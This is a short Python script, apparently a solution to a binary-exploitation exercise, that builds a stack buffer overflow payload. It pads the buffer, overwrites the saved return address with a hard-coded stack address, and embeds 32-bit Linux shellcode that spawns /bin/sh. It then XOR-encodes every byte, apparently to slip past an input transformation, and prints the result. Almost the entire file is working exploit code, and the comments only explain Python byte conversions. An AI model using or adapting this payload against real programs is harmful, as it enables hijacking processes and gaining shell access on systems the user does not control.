#!/usr/bin/env python

head_fill = (0xbffff80c - 0xbffff808) * "o"

new_rip = "\x10\xf8\xff\xbf" # 0xbffff810

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

alll = head_fill + new_rip + shellcode

tail_fill = (64 - len(alll)) * "o"

alll += tail_fill + "\x08"

alll = [e for e in alll]   # separate all into ["\xeb", "\x1f", ...]

alll = [ord(e) for e in alll]   # transform all to decimal number [12, 30, ...], ord works
                              # single char only
                              # if all in form ["0xeb", "0x1f", ...] use int(ele, 0) for
                              # each element

alll = [e ^ (1 << 5) for e in alll]    # perform flip bit ( ^ 100000)

alll = [chr(e) for e in alll]   # transform all from [157, 63, ...] into["\xab","xfe", ...] (from ascii code to character)
                              # if need [153, 63, ...] info ['0x99', '0x3f',...], then use hex(), hex() transform a number to hex-string (bin() do the same to bin-string)
                              # chr() is the reverse of ord()

ret = ""

for e in alll:
  ret += e

ret += "\0"
print(ret)
